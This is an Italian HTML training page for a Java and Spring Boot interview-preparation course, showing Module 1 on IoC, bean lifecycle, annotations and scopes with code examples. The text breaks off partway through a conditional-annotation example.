<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Percorso di Formazione Tech 2026</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0d1117;
            --bg-secondary: #161b22;
            --bg-tertiary: #21262d;
            --text-primary: #e6edf3;
            --text-secondary: #8b949e;
            --accent-primary: #58a6ff;
            --accent-secondary: #238636;
            --accent-warning: #d29922;
            --accent-danger: #f85149;
            --border-color: #30363d;
            --code-bg: #1a1f26;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
            background-color: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.6;
        }

        /* Layout */
        .container {
            display: flex;
            min-height: 100vh;
        }

        /* Sidebar */
        .sidebar {
            width: 280px;
            background-color: var(--bg-secondary);
            border-right: 1px solid var(--border-color);
            position: fixed;
            height: 100vh;
            overflow-y: auto;
            padding: 20px 0;
        }

        .sidebar-header {
            padding: 0 20px 20px;
            border-bottom: 1px solid var(--border-color);
            margin-bottom: 15px;
        }

        .sidebar-header h1 {
            font-size: 1.2rem;
            color: var(--accent-primary);
            margin-bottom: 5px;
        }

        .sidebar-header span {
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        .nav-section {
            padding: 10px 20px;
        }

        .nav-section h3 {
            font-size: 0.75rem;
            text-transform: uppercase;
            color: var(--text-secondary);
            margin-bottom: 10px;
            letter-spacing: 0.5px;
        }

        .nav-link {
            display: block;
            padding: 8px 12px;
            color: var(--text-primary);
            text-decoration: none;
            border-radius: 6px;
            margin-bottom: 4px;
            font-size: 0.9rem;
            transition: background-color 0.2s;
        }

        .nav-link:hover {
            background-color: var(--bg-tertiary);
        }

        .nav-link.active {
            background-color: var(--bg-tertiary);
            color: var(--accent-primary);
            font-weight: 500;
        }

        .nav-sublink {
            padding-left: 24px;
            font-size: 0.85rem;
            color: var(--text-secondary);
        }

        /* Main Content */
        .main-content {
            margin-left: 280px;
            flex: 1;
            padding: 40px 60px;
            max-width: 900px;
        }

        .module-header {
            margin-bottom: 40px;
            padding-bottom: 20px;
            border-bottom: 1px solid var(--border-color);
        }

        .module-tag {
            display: inline-block;
            background-color: var(--accent-primary);
            color: var(--bg-primary);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-bottom: 15px;
        }

        .module-header h1 {
            font-size: 2.2rem;
            margin-bottom: 10px;
        }

        .module-header p {
            color: var(--text-secondary);
            font-size: 1.1rem;
        }

        /* Content Sections */
        .section {
            margin-bottom: 50px;
        }

        .section h2 {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: var(--accent-primary);
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .section h2::before {
            content: "►";
            font-size: 0.8rem;
        }

        .section h3 {
            font-size: 1.2rem;
            margin: 25px 0 15px;
            color: var(--text-primary);
        }

        .section p {
            margin-bottom: 15px;
            color: var(--text-secondary);
        }

        /* Info Box */
        .info-box {
            background-color: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-left: 4px solid var(--accent-primary);
            border-radius: 6px;
            padding: 20px;
            margin: 20px 0;
        }

        .info-box.warning {
            border-left-color: var(--accent-warning);
        }

        .info-box.success {
            border-left-color: var(--accent-secondary);
        }

        .info-box h4 {
            color: var(--accent-primary);
            margin-bottom: 10px;
            font-size: 1rem;
        }

        .info-box.warning h4 {
            color: var(--accent-warning);
        }

        .info-box.success h4 {
            color: var(--accent-secondary);
        }

        /* Code Blocks */
        pre {
            background-color: var(--code-bg) !important;
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 20px !important;
            margin: 20px 0 !important;
            overflow-x: auto;
        }

        code {
            font-family: 'Fira Code', 'Consolas', 'Monaco', monospace;
            font-size: 0.9rem;
        }

        :not(pre) > code {
            background-color: var(--bg-tertiary);
            padding: 2px 8px;
            border-radius: 4px;
            color: var(--accent-primary);
        }

        /* Lists */
        ul, ol {
            margin: 15px 0;
            padding-left: 25px;
            color: var(--text-secondary);
        }

        li {
            margin-bottom: 8px;
        }

        /* Tables */
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }

        th, td {
            padding: 12px 15px;
            text-align: left;
            border: 1px solid var(--border-color);
        }

        th {
            background-color: var(--bg-secondary);
            color: var(--accent-primary);
            font-weight: 600;
        }

        td {
            color: var(--text-secondary);
        }

        tr:hover td {
            background-color: var(--bg-secondary);
        }

        /* Quiz Section */
        .quiz-section {
            background-color: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 30px;
            margin-top: 50px;
        }

        .quiz-section h2 {
            color: var(--accent-warning);
            margin-bottom: 25px;
        }

        .quiz-section h2::before {
            content: "⚡";
        }

        .quiz-question {
            margin-bottom: 30px;
            padding-bottom: 30px;
            border-bottom: 1px solid var(--border-color);
        }

        .quiz-question:last-of-type {
            border-bottom: none;
        }

        .quiz-question h4 {
            font-size: 1.1rem;
            margin-bottom: 15px;
            color: var(--text-primary);
        }

        .quiz-question h4 span {
            color: var(--accent-warning);
        }

        .quiz-options {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .quiz-option {
            display: flex;
            align-items: flex-start;
            gap: 12px;
            padding: 15px;
            background-color: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .quiz-option:hover {
            border-color: var(--accent-primary);
        }

        .quiz-option input {
            margin-top: 3px;
            accent-color: var(--accent-primary);
        }

        .quiz-option label {
            cursor: pointer;
            color: var(--text-secondary);
            flex: 1;
        }

        .quiz-option.correct {
            border-color: var(--accent-secondary);
            background-color: rgba(35, 134, 54, 0.1);
        }

        .quiz-option.incorrect {
            border-color: var(--accent-danger);
            background-color: rgba(248, 81, 73, 0.1);
        }

        .feedback {
            display: none;
            margin-top: 15px;
            padding: 15px;
            border-radius: 8px;
            font-size: 0.95rem;
        }

        .feedback.correct {
            display: block;
            background-color: rgba(35, 134, 54, 0.15);
            border: 1px solid var(--accent-secondary);
            color: var(--accent-secondary);
        }

        .feedback.incorrect {
            display: block;
            background-color: rgba(248, 81, 73, 0.15);
            border: 1px solid var(--accent-danger);
            color: var(--text-primary);
        }

        .feedback strong {
            display: block;
            margin-bottom: 8px;
        }

        .check-btn {
            background-color: var(--accent-primary);
            color: var(--bg-primary);
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: opacity 0.2s;
        }

        .check-btn:hover {
            opacity: 0.9;
        }

        .check-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* Diagram */
        .diagram {
            background-color: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 30px;
            margin: 25px 0;
            text-align: center;
            font-family: 'Fira Code', monospace;
            overflow-x: auto;
        }

        .diagram pre {
            background: transparent !important;
            border: none;
            padding: 0 !important;
            margin: 0 !important;
            text-align: left;
            display: inline-block;
        }

        /* Mobile menu button */
        .mobile-menu-btn {
            display: none;
            position: fixed;
            top: 15px;
            left: 15px;
            z-index: 1001;
            background-color: var(--bg-secondary);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            width: 44px;
            height: 44px;
            border-radius: 8px;
            cursor: pointer;
            align-items: center;
            justify-content: center;
            font-size: 1.4rem;
            line-height: 1;
            -webkit-tap-highlight-color: transparent;
        }

        .mobile-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.5);
            z-index: 999;
        }

        .mobile-overlay.active {
            display: block;
        }

        /* Responsive */
        @media (max-width: 1024px) {
            .sidebar {
                width: 60px;
                padding: 15px 5px;
            }

            .sidebar-header, .nav-section h3, .nav-link span {
                display: none;
            }

            .nav-link {
                text-align: center;
                padding: 12px;
            }

            .main-content {
                margin-left: 60px;
                padding: 30px;
            }
        }

        @media (max-width: 768px) {
            .mobile-menu-btn {
                display: flex;
            }

            .sidebar {
                display: flex;
                flex-direction: column;
                width: 280px;
                transform: translateX(-100%);
                transition: transform 0.3s ease;
                z-index: 1000;
                padding: 20px 0;
            }

            .sidebar.open {
                transform: translateX(0);
            }

            .sidebar-header, .nav-section h3, .nav-link span {
                display: block;
            }

            .sidebar .nav-link {
                text-align: left;
                padding: 8px 12px;
            }

            .main-content {
                margin-left: 0;
                padding: 20px 16px;
                padding-top: 70px;
            }

            .module-header h1 {
                font-size: 1.5rem;
            }

            .module-header p {
                font-size: 0.95rem;
            }

            .section h2 {
                font-size: 1.25rem;
            }

            .section h3 {
                font-size: 1.05rem;
            }

            pre {
                padding: 14px !important;
                font-size: 0.78rem;
            }

            code {
                font-size: 0.8rem;
            }

            .diagram {
                padding: 15px 10px;
            }

            .diagram pre {
                font-size: 0.65rem;
            }

            .info-box {
                padding: 15px;
            }

            table {
                display: block;
                overflow-x: auto;
                -webkit-overflow-scrolling: touch;
            }

            th, td {
                padding: 8px 10px;
                font-size: 0.85rem;
                white-space: nowrap;
            }

            .quiz-section {
                padding: 20px 15px;
            }

            .quiz-option {
                padding: 12px;
            }

            .quiz-question h4 {
                font-size: 1rem;
            }
        }

        @media (max-width: 400px) {
            .main-content {
                padding: 15px 12px;
                padding-top: 65px;
            }

            .module-header h1 {
                font-size: 1.3rem;
            }

            pre {
                padding: 10px !important;
                font-size: 0.72rem;
            }

            .diagram pre {
                font-size: 0.58rem;
            }

            th, td {
                padding: 6px 8px;
                font-size: 0.8rem;
            }
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: var(--bg-primary);
        }

        ::-webkit-scrollbar-thumb {
            background: var(--border-color);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--text-secondary);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Mobile menu button -->
        <button class="mobile-menu-btn" aria-label="Apri menu" onclick="toggleMobileMenu()">&#9776;</button>
        <div class="mobile-overlay" onclick="toggleMobileMenu()"></div>

        <!-- Sidebar Navigation -->
        <nav class="sidebar">
            <div class="sidebar-header">
                <h1>Formazione Tech 2026</h1>
                <span>Percorso di Approfondimento</span>
            </div>

            <div class="nav-section">
                <h3>Moduli</h3>
                <a href="#modulo1" class="nav-link active">
                    <span>1. Java & Spring Boot</span>
                </a>
                <a href="#modulo1-ioc" class="nav-link nav-sublink">IoC & Bean Lifecycle</a>
                <a href="#modulo1-annotations" class="nav-link nav-sublink">Spring Annotations</a>
                <a href="#modulo1-proxy" class="nav-link nav-sublink">Proxy Pattern</a>
                <a href="#modulo1-transactional" class="nav-link nav-sublink">@Transactional</a>
                <a href="#modulo1-security" class="nav-link nav-sublink">Spring Security</a>
                <a href="#modulo1-jpa" class="nav-link nav-sublink">JPA & N+1</a>
                <a href="#modulo1-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo2" class="nav-link"><span>2. Testing Strategy</span></a>
                <a href="#modulo2-pyramid" class="nav-link nav-sublink">Test Pyramid</a>
                <a href="#modulo2-types" class="nav-link nav-sublink">Unit vs Integration vs E2E</a>
                <a href="#modulo2-mocking" class="nav-link nav-sublink">Mocking vs Stubbing</a>
                <a href="#modulo2-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo3" class="nav-link"><span>3. Architettura & Scalabilità</span></a>
                <a href="#modulo3-monolith-micro" class="nav-link nav-sublink">Monoliti vs Microservizi</a>
                <a href="#modulo3-resilience" class="nav-link nav-sublink">Resilience Patterns</a>
                <a href="#modulo3-cap" class="nav-link nav-sublink">CAP Theorem</a>
                <a href="#modulo3-loadbalancing" class="nav-link nav-sublink">Load Balancing</a>
                <a href="#modulo3-caching" class="nav-link nav-sublink">Caching Strategies</a>
                <a href="#modulo3-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo4" class="nav-link"><span>4. Database & Messaging</span></a>
                <a href="#modulo4-sql-nosql" class="nav-link nav-sublink">SQL vs NoSQL</a>
                <a href="#modulo4-kafka" class="nav-link nav-sublink">Apache Kafka</a>
                <a href="#modulo4-rabbitmq" class="nav-link nav-sublink">RabbitMQ</a>
                <a href="#modulo4-comparison" class="nav-link nav-sublink">Kafka vs RabbitMQ</a>
                <a href="#modulo4-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo5" class="nav-link"><span>5. Cloud & DevOps</span></a>
                <a href="#modulo5-docker" class="nav-link nav-sublink">Docker</a>
                <a href="#modulo5-kubernetes" class="nav-link nav-sublink">Kubernetes</a>
                <a href="#modulo5-cicd" class="nav-link nav-sublink">CI/CD Pipelines</a>
                <a href="#modulo5-deployment" class="nav-link nav-sublink">Deployment Strategies</a>
                <a href="#modulo5-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo6" class="nav-link"><span>6. Advanced Topics 2026</span></a>
                <a href="#modulo6-observability" class="nav-link nav-sublink">Observability</a>
                <a href="#modulo6-terraform" class="nav-link nav-sublink">Infrastructure as Code</a>
                <a href="#modulo6-ai" class="nav-link nav-sublink">LLM & AI Integration</a>
                <a href="#modulo6-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo7" class="nav-link"><span>7. Coding Challenges</span></a>
                <a href="#modulo7-lru" class="nav-link nav-sublink">LRU Cache</a>
                <a href="#modulo7-parentheses" class="nav-link nav-sublink">Valid Parentheses</a>
                <a href="#modulo7-intervals" class="nav-link nav-sublink">Merge Intervals</a>
                <a href="#modulo7-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo8" class="nav-link"><span>8. Paradigmi di Programmazione</span></a>
                <a href="#modulo8-functional" class="nav-link nav-sublink">Programmazione Funzionale</a>
                <a href="#modulo8-streams" class="nav-link nav-sublink">Java Streams</a>
                <a href="#modulo8-comparison" class="nav-link nav-sublink">OOP vs FP</a>
                <a href="#modulo8-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo9" class="nav-link"><span>9. API Design</span></a>
                <a href="#modulo9-rest" class="nav-link nav-sublink">REST Best Practices</a>
                <a href="#modulo9-versioning" class="nav-link nav-sublink">Versioning & Errors</a>
                <a href="#modulo9-comparison" class="nav-link nav-sublink">REST vs GraphQL vs gRPC</a>
                <a href="#modulo9-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo10" class="nav-link"><span>10. Security</span></a>
                <a href="#modulo10-owasp" class="nav-link nav-sublink">OWASP Top 10</a>
                <a href="#modulo10-auth" class="nav-link nav-sublink">Authentication</a>
                <a href="#modulo10-authorization" class="nav-link nav-sublink">Authorization</a>
                <a href="#modulo10-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo11" class="nav-link"><span>11. DDD & Clean Architecture</span></a>
                <a href="#modulo11-ddd" class="nav-link nav-sublink">Domain Driven Design</a>
                <a href="#modulo11-clean" class="nav-link nav-sublink">Clean Architecture</a>
                <a href="#modulo11-cqrs" class="nav-link nav-sublink">Event Sourcing & CQRS</a>
                <a href="#modulo11-quiz" class="nav-link nav-sublink">Quiz</a>

                <a href="#modulo12" class="nav-link"><span>12. Data Structures</span></a>
                <a href="#modulo12-trees" class="nav-link nav-sublink">Trees & Tries</a>
                <a href="#modulo12-graphs" class="nav-link nav-sublink">Graphs</a>
                <a href="#modulo12-heaps" class="nav-link nav-sublink">Heaps & Priority Queue</a>
                <a href="#modulo12-unionfind" class="nav-link nav-sublink">Union-Find</a>
                <a href="#modulo12-quiz" class="nav-link nav-sublink">Quiz</a>
                <a href="#modulo12-questions" class="nav-link nav-sublink">Domande</a>

                <a href="#modulo13" class="nav-link"><span>13. System Design</span></a>
                <a href="#modulo13-framework" class="nav-link nav-sublink">Framework</a>
                <a href="#modulo13-urlshortener" class="nav-link nav-sublink">URL Shortener</a>
                <a href="#modulo13-chat" class="nav-link nav-sublink">Chat System</a>
                <a href="#modulo13-newsfeed" class="nav-link nav-sublink">News Feed</a>
                <a href="#modulo13-ratelimiter" class="nav-link nav-sublink">Rate Limiter</a>
                <a href="#modulo13-notification" class="nav-link nav-sublink">Notification System</a>
                <a href="#modulo13-patterns" class="nav-link nav-sublink">Pattern Ricorrenti</a>
                <a href="#modulo13-quiz" class="nav-link nav-sublink">Quiz</a>
                <a href="#modulo13-questions" class="nav-link nav-sublink">Domande</a>

                <a href="#modulo14" class="nav-link"><span>14. Concurrency</span></a>
                <a href="#modulo14-fundamentals" class="nav-link nav-sublink">Fondamenti</a>
                <a href="#modulo14-executors" class="nav-link nav-sublink">Executors & Futures</a>
                <a href="#modulo14-synchronizers" class="nav-link nav-sublink">Synchronizers</a>
                <a href="#modulo14-collections" class="nav-link nav-sublink">Concurrent Collections</a>
                <a href="#modulo14-virtual" class="nav-link nav-sublink">Virtual Threads</a>
                <a href="#modulo14-patterns" class="nav-link nav-sublink">Pattern</a>
                <a href="#modulo14-quiz" class="nav-link nav-sublink">Quiz</a>
                <a href="#modulo14-questions" class="nav-link nav-sublink">Domande</a>

                <a href="#modulo15" class="nav-link"><span>15. Design Patterns</span></a>
                <a href="#modulo15-creational" class="nav-link nav-sublink">Creational</a>
                <a href="#modulo15-structural" class="nav-link nav-sublink">Structural</a>
                <a href="#modulo15-behavioral" class="nav-link nav-sublink">Behavioral</a>
                <a href="#modulo15-antipatterns" class="nav-link nav-sublink">Anti-patterns</a>
                <a href="#modulo15-quiz" class="nav-link nav-sublink">Quiz</a>
                <a href="#modulo15-questions" class="nav-link nav-sublink">Domande</a>

                <a href="#modulo16" class="nav-link"><span>16. Java Internals & JVM</span></a>
                <a href="#modulo16-classloading" class="nav-link nav-sublink">Class Loading</a>
                <a href="#modulo16-memory" class="nav-link nav-sublink">Memory Model</a>
                <a href="#modulo16-gc" class="nav-link nav-sublink">Garbage Collection</a>
                <a href="#modulo16-generics" class="nav-link nav-sublink">Generics Deep Dive</a>
                <a href="#modulo16-modern" class="nav-link nav-sublink">Java 17+ Features</a>
                <a href="#modulo16-quiz" class="nav-link nav-sublink">Quiz</a>
                <a href="#modulo16-questions" class="nav-link nav-sublink">Domande</a>

                <a href="#modulo17" class="nav-link"><span>17. Distributed Systems</span></a>
                <a href="#modulo17-saga" class="nav-link nav-sublink">Saga Pattern</a>
                <a href="#modulo17-transactions" class="nav-link nav-sublink">Distributed Transactions</a>
                <a href="#modulo17-idempotency" class="nav-link nav-sublink">Idempotency</a>
                <a href="#modulo17-consensus" class="nav-link nav-sublink">Consensus & Raft</a>
                <a href="#modulo17-locking" class="nav-link nav-sublink">Distributed Locking</a>
                <a href="#modulo17-quiz" class="nav-link nav-sublink">Quiz</a>
                <a href="#modulo17-questions" class="nav-link nav-sublink">Domande</a>

                <a href="#modulo18" class="nav-link"><span>18. Coding Patterns</span></a>
                <a href="#modulo18-dp" class="nav-link nav-sublink">Dynamic Programming</a>
                <a href="#modulo18-slidingwindow" class="nav-link nav-sublink">Sliding Window</a>
                <a href="#modulo18-twopointers" class="nav-link nav-sublink">Two Pointers</a>
                <a href="#modulo18-backtracking" class="nav-link nav-sublink">Backtracking</a>
                <a href="#modulo18-binarysearch" class="nav-link nav-sublink">Binary Search</a>
                <a href="#modulo18-quiz" class="nav-link nav-sublink">Quiz</a>
                <a href="#modulo18-questions" class="nav-link nav-sublink">Domande</a>
            </div>
        </nav>

        <!-- Main Content -->
        <main class="main-content">
            <header class="module-header" id="modulo1">
                <span class="module-tag">Modulo 1</span>
                <h1>Java & Spring Boot Deep Dive</h1>
                <p>Comprensione avanzata del framework Spring, dal container IoC alla gestione delle transazioni</p>
            </header>

            <!-- IoC Section -->
            <section class="section" id="modulo1-ioc">
                <h2>Inversion of Control & Dependency Injection</h2>

                <p>L'<strong>Inversion of Control</strong> (IoC) è un principio di design in cui il controllo del flusso di un programma viene invertito rispetto alla programmazione tradizionale. Invece di essere il nostro codice a creare e gestire le dipendenze, deleghiamo questa responsabilità a un <em>container</em>.</p>

                <div class="info-box">
                    <h4>Differenza chiave</h4>
                    <p>Nella programmazione tradizionale, la classe A crea direttamente un'istanza di B (<code>new B()</code>). Con IoC, la classe A dichiara di aver bisogno di B, e il container si occupa di fornirla (<strong>Dependency Injection</strong>).</p>
                </div>

                <h3>Tipi di Dependency Injection in Spring</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Tipo</th>
                            <th>Pro</th>
                            <th>Contro</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>Constructor Injection</code></td>
                            <td>Immutabilità, dipendenze obbligatorie esplicite, testabilità</td>
                            <td>Costruttori verbosi con molte dipendenze</td>
                        </tr>
                        <tr>
                            <td><code>Setter Injection</code></td>
                            <td>Dipendenze opzionali, riconfigurabilità</td>
                            <td>Oggetti potenzialmente in stato incompleto</td>
                        </tr>
                        <tr>
                            <td><code>Field Injection</code></td>
                            <td>Codice conciso</td>
                            <td>Difficile da testare, nasconde le dipendenze</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box success">
                    <h4>Best Practice</h4>
                    <p>Preferisci sempre <strong>Constructor Injection</strong>. È l'approccio raccomandato dal team Spring perché garantisce l'immutabilità del bean e rende le dipendenze esplicite. Con Lombok, puoi usare <code>@RequiredArgsConstructor</code> per evitare boilerplate.</p>
                </div>

                <pre><code class="language-java">// ❌ Field Injection - da evitare
@Service
public class OrderService {
    @Autowired
    private PaymentService paymentService;
}

// ✅ Constructor Injection - approccio consigliato
@Service
@RequiredArgsConstructor
public class OrderService {
    private final PaymentService paymentService;
    private final InventoryService inventoryService;

    // Lombok genera il costruttore automaticamente
}</code></pre>

                <h3>Bean Lifecycle</h3>

                <p>Comprendere il ciclo di vita di un Bean è fondamentale per gestire correttamente l'inizializzazione delle risorse e il cleanup. Ecco le fasi principali:</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         SPRING BEAN LIFECYCLE                               │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. INSTANTIATION                                                          │
│      └── Spring crea l'istanza del bean (new o reflection)                  │
│                           │                                                 │
│                           ▼                                                 │
│   2. POPULATE PROPERTIES                                                    │
│      └── Dependency Injection (constructor, setter, field)                  │
│                           │                                                 │
│                           ▼                                                 │
│   3. BEAN NAME AWARE                                                        │
│      └── setBeanName() se implementa BeanNameAware                          │
│                           │                                                 │
│                           ▼                                                 │
│   4. BEAN FACTORY AWARE                                                     │
│      └── setBeanFactory() se implementa BeanFactoryAware                    │
│                           │                                                 │
│                           ▼                                                 │
│   5. PRE-INITIALIZATION (BeanPostProcessor)                                 │
│      └── postProcessBeforeInitialization()                                  │
│                           │                                                 │
│                           ▼                                                 │
│   6. INITIALIZATION                                                         │
│      ├── @PostConstruct                                                     │
│      ├── InitializingBean.afterPropertiesSet()                              │
│      └── Custom init-method                                                 │
│                           │                                                 │
│                           ▼                                                 │
│   7. POST-INITIALIZATION (BeanPostProcessor)                                │
│      └── postProcessAfterInitialization()                                   │
│          ⚠️  Qui vengono creati i PROXY (AOP, @Transactional)               │
│                           │                                                 │
│                           ▼                                                 │
│   8. BEAN READY                                                             │
│      └── Il bean è pronto per l'uso                                         │
│                           │                                                 │
│                           ▼                                                 │
│   9. DESTRUCTION (alla chiusura del context)                                │
│      ├── @PreDestroy                                                        │
│      ├── DisposableBean.destroy()                                           │
│      └── Custom destroy-method                                              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">@Component
public class DatabaseConnectionPool implements InitializingBean, DisposableBean {

    private Connection connection;

    @PostConstruct
    public void init() {
        // Eseguito DOPO la dependency injection
        // Ideale per logica di inizializzazione leggera
        log.info("PostConstruct: inizializzazione risorse");
    }

    @Override
    public void afterPropertiesSet() throws Exception {
        // Eseguito DOPO @PostConstruct
        // Usato quando si ha bisogno di accesso al BeanFactory
        this.connection = dataSource.getConnection();
    }

    @PreDestroy
    public void cleanup() {
        // Eseguito durante lo shutdown del context
        // Rilascia risorse, chiudi connessioni
        if (connection != null) {
            connection.close();
        }
    }

    @Override
    public void destroy() throws Exception {
        // Eseguito DOPO @PreDestroy
        log.info("Bean destroyed");
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Domanda frequente ai colloqui</h4>
                    <p>"Qual è la differenza tra <code>@PostConstruct</code> e il costruttore?"<br><br>
                    <strong>Risposta:</strong> Il costruttore viene chiamato <em>prima</em> che le dipendenze vengano iniettate (nel caso di setter/field injection). <code>@PostConstruct</code> viene chiamato <em>dopo</em> che tutte le dipendenze sono state iniettate, quindi è il posto sicuro per usare le dipendenze iniettate.</p>
                </div>
            </section>

            <!-- Spring Annotations Section -->
            <section class="section" id="modulo1-annotations">
                <h2>Spring Annotations - Le più richieste ai colloqui</h2>

                <p>Le annotation sono il cuore di Spring Boot. Conoscere le differenze sottili tra annotation simili è spesso oggetto di domande nei colloqui tecnici.</p>

                <h3>Core Stereotype Annotations</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Annotation</th>
                            <th>Descrizione</th>
                            <th>Layer</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>@Component</code></td>
                            <td>Annotation generica per qualsiasi bean Spring</td>
                            <td>Generico</td>
                        </tr>
                        <tr>
                            <td><code>@Service</code></td>
                            <td>Specializzazione di @Component per la business logic</td>
                            <td>Service Layer</td>
                        </tr>
                        <tr>
                            <td><code>@Repository</code></td>
                            <td>Specializzazione per DAO/persistence. Abilita la traduzione delle eccezioni DB</td>
                            <td>Data Access Layer</td>
                        </tr>
                        <tr>
                            <td><code>@Controller</code></td>
                            <td>Per MVC controllers che ritornano views</td>
                            <td>Web Layer</td>
                        </tr>
                        <tr>
                            <td><code>@RestController</code></td>
                            <td><code>@Controller</code> + <code>@ResponseBody</code> su ogni metodo</td>
                            <td>Web Layer (REST)</td>
                        </tr>
                        <tr>
                            <td><code>@Configuration</code></td>
                            <td>Classe che contiene definizioni di bean (<code>@Bean</code> methods)</td>
                            <td>Configuration</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>Domanda da colloquio</h4>
                    <p>"Qual è la differenza funzionale tra <code>@Service</code> e <code>@Component</code>?"<br><br>
                    <strong>Risposta:</strong> A livello funzionale, nessuna. Entrambi registrano un bean nel container. La differenza è <em>semantica</em>: <code>@Service</code> comunica l'intento (business logic), facilita la lettura del codice, e permette l'applicazione di AOP specifici per layer (es: logging solo sui service).</p>
                </div>

                <h3>Dependency Injection Annotations</h3>

                <pre><code class="language-java">// @Autowired - Injection automatica per tipo
@Service
public class OrderService {
    @Autowired  // Field injection (sconsigliato)
    private PaymentService paymentService;

    @Autowired  // Setter injection
    public void setPaymentService(PaymentService paymentService) {
        this.paymentService = paymentService;
    }

    @Autowired  // Constructor injection (consigliato)
    public OrderService(PaymentService paymentService) {
        this.paymentService = paymentService;
    }
}

// @Qualifier - Disambigua quando ci sono più bean dello stesso tipo
@Service
public class NotificationService {
    @Autowired
    @Qualifier("emailSender")  // Specifica quale implementazione usare
    private MessageSender sender;
}

// @Primary - Indica il bean preferito quando ce ne sono multipli
@Configuration
public class SenderConfig {
    @Bean
    @Primary  // Questo sarà iniettato di default
    public MessageSender emailSender() {
        return new EmailSender();
    }

    @Bean
    public MessageSender smsSender() {
        return new SmsSender();
    }
}

// @Value - Inietta valori da properties
@Component
public class AppConfig {
    @Value("${app.name}")
    private String appName;

    @Value("${app.timeout:30}")  // Con valore di default
    private int timeout;

    @Value("#{systemProperties['user.home']}")  // SpEL expression
    private String userHome;
}</code></pre>

                <h3>Bean Scope Annotations</h3>

                <pre><code class="language-java">// @Scope - Definisce il lifecycle del bean
@Component
@Scope("singleton")  // Default: una sola istanza per ApplicationContext
public class SingletonBean { }

@Component
@Scope("prototype")  // Nuova istanza ad ogni injection/richiesta
public class PrototypeBean { }

@Component
@Scope(value = WebApplicationContext.SCOPE_REQUEST, proxyMode = ScopedProxyMode.TARGET_CLASS)
public class RequestScopedBean { }  // Una istanza per HTTP request

@Component
@Scope(value = WebApplicationContext.SCOPE_SESSION, proxyMode = ScopedProxyMode.TARGET_CLASS)
public class SessionScopedBean { }  // Una istanza per HTTP session</code></pre>

                <div class="info-box warning">
                    <h4>Attenzione: Prototype in Singleton</h4>
                    <p>Se inietti un bean <code>prototype</code> in un <code>singleton</code>, il prototype viene creato UNA sola volta (al momento dell'injection nel singleton). Per ottenere una nuova istanza ogni volta, usa <code>ObjectFactory&lt;T&gt;</code>, <code>Provider&lt;T&gt;</code>, o <code>@Lookup</code>.</p>
                </div>

                <pre><code class="language-java">// Soluzione con Provider per prototype injection
@Service
public class OrderService {
    private final Provider&lt;ShoppingCart&gt; cartProvider;

    public OrderService(Provider&lt;ShoppingCart&gt; cartProvider) {
        this.cartProvider = cartProvider;
    }

    public void processOrder() {
        ShoppingCart cart = cartProvider.get();  // Nuova istanza ogni volta
    }
}

// Soluzione con @Lookup
@Service
public abstract class OrderService {
    @Lookup
    protected abstract ShoppingCart getShoppingCart();  // Spring sovrascrive questo metodo

    public void processOrder() {
        ShoppingCart cart = getShoppingCart();  // Nuova istanza ogni volta
    }
}</code></pre>

                <h3>Conditional Annotations</h3>

                <pre><code class="language-java">// @Conditional - Registra bean solo se la condizione è vera
@Configuration
public class DatabaseConfig {

    @Bean
    @ConditionalOnProperty(name = "db.type", havingValue = "mysql")
    public DataSource mysqlDataSource() {
        return new MysqlDataSource();
    }

    @Bean
    @ConditionalOnProperty(name = "db.type", havingValue = "postgres")
    public DataSource postgresDataSource() {
        return new PostgresDataSource();
    }

